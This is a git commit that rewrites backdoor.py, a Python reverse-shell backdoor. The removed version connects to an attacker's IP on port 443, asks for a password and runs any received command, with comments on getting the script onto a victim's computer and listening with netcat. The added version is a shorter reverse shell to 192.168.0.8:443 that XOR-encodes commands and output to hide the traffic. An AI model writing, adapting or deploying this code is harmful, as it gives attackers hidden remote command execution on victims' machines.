17cb9a57a99a05dbbba6285972490cb70da605c3
toxic <filip.herle@gmail.com>
2017-02-07 20:28:46 -0800

    Add files via upload

--- backdoor.py
+++ backdoor.py
@@ -1,60 +1,28 @@
-
 #!/usr/bin/python
-import subprocess #Process commands
-import socket #Process socket data
-import os
-import sys
-import time
-W  = '[0m'  # white (normal)
-R  = '[31m' # red
-G  = '[32m' # green
-O  = '[33m' # orange
-B  = '[34m' # blue
-P  = '[35m' # purple
-C  = '[36m' # cyan
-GR = '[37m' # gray
-T  = '[93m' # tan
-#To test this on one computer open 2 terminals and make sure your root.
-#In terminal 1 type "nc -lvp 443" without the quotes
-#Or use the listener
-#In the other terminal open the this python script and there you go! 
-#[!]You have get this python script onto the victims computer[!]#
-#--------------THE REAL CODE---------------#
-
-host = "127.0.0.1" #Attack computers ip <-- Change to whatever your ip is (internal)
-port = 443   #Attack port
-passwd = "root" #Password so other people cant connect
-
-#Check password
-def Login():
-   global s
-   s.send(""+T+"Login:"+W+"")
-   pwd = s.recv(1024)
-
-   if pwd.strip() != passwd:     
-      Login()
-   else:
-      s.send(""+G+"Connected #>"+W+"")
-      Shell()
-
-#Execute shell commands
-def Shell():
-   while True:
-      data = s.recv(1024)
-
-      if data.strip() == ":kill": 
-         break
-
-      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-      output = proc.stdout.read() + proc.stderr.read()
-      s.send(output)
-      s.send(""+G+"#>"+W+"")
-
-#Start Script
-try:
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host,port))
-    print ""
-    Login()
-except:
-    print ""
+ 
+import socket,subprocess,sys
+ 
+RHOST = "192.168.0.8"
+RPORT = 443
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+ 
+while True:
+     # recieve XOR encoded data from network socket
+     data = s.recv(1024)
+ 
+     # XOR the data again with a 'x41' to get back to normal data
+     en_data = bytearray(data)
+     for i in range(len(en_data)):
+       en_data[i] ^=0x41
+ 
+     # Execute the decoded data as a command.  The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable
+     comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     STDOUT, STDERR = comm.communicate()
+ 
+     # Encode the output and send to RHOST
+     en_STDOUT = bytearray(STDOUT)
+     for i in range(len(en_STDOUT)):
+       en_STDOUT[i] ^=0x41
+     s.send(en_STDOUT)
+s.close()
